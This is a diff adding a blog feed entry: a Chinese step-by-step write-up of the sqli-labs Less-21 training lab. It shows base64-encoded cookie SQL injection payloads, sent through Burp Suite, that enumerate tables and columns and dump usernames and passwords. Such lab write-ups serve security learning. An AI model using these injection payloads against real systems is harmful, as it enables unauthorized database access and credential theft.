@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>sqli-labs Less21</title>
+      <link href="/2019/11/25/sqli-labs-Less21/"/>
+      <url>/2019/11/25/sqli-labs-Less21/</url>
+      
+        <content type="html"><![CDATA[<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li><strong>正确登录到界面后，发现 cookie 值有些不同</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/iOVvyM326TElYgn.png" alt="less21-1.png"></p><ol start="2"><li><strong>从输出的字符来看，cookie 是被加密了。</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">YWRtaW4=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>看到加密字符串最后有一个 <code>=</code> ,首先想到的是 base64，尝试解密。</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/aQ5Dx7kXYKAdUT3.png" alt="less21-2.png"></p><p><img src="https://i.loli.net/2019/11/26/FcBO3Res1LozYhD.png" alt="less21-3.png"></p><ol start="4"><li><strong>使用 base64 将 payload 加密</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：admin' union select 1,user(),database()#base64：YWRtaW4nIHVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="5"><li><strong>尝试使用 modify headers 修改 cookie 并刷新界面。发现无法成功，界面转到了登录界面</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/UzXhyqkBs48npr9.png" alt="less21-4.png"></p><p><img src="https://i.loli.net/2019/11/26/z6hV2WyMCUbiIGo.png" alt="less21-5.png"></p><ol start="6"><li><strong>使用 burpsuit 抓包，改 cookie 值,并重新转发</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/2ghM7kBrFaKf1cn.png" alt="less21-6.png"></p><p><img src="https://i.loli.net/2019/11/26/LvW18ztCnIRUDp9.png" alt="less21-7.png"></p><ol start="7"><li><strong>从上面发现 sql 语句报错有 ” ‘) “，重新修改 payload。</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin') union select 1,user(),database()#base64：LWFkbWluJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/5apk9Igq2uPLErJ.png" alt="less21-8.png"></p><p>注：union 前面的值要为空，第四步忘记改为空值了</p><ol start="8"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyBXSEVSRSBUQUJMRV9TQ0hFTUE9J3NlY3VyaXR5JyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/9w2Y6elNZqD3aWA.png" alt="less21-9.png"></p><ol start="9"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5DT0xVTU5TIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIEFORCBUQUJMRV9OQU1FPSd1c2Vycycj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/b7XWhAfto35BU8m.png" alt="less21-10.png"></p><ol start="10"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh1c2VybmFtZSksZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBGUk9NIHNlY3VyaXR5LnVzZXJzIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/sZ52OUvYQ81Wrtj.png" alt="less21-11.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://www.pianshen.com/article/4049219913/" target="_blank" rel="noopener">Sqli-Lab | Less 21-23</a></p><p><a href="https://warwolf767.gitbooks.io/sqli-lab/content/less_21_-_less_30.html" target="_blank" rel="noopener">SQLI-LAB 的 实战记录(Less 21 - Less 30)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sqli-labs </tag>
+            
+            <tag> SQL Injection </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP 语法</title>
       <link href="/2019/11/24/php%E8%AF%AD%E6%B3%95/"/>
       <url>/2019/11/24/php%E8%AF%AD%E6%B3%95/</url>
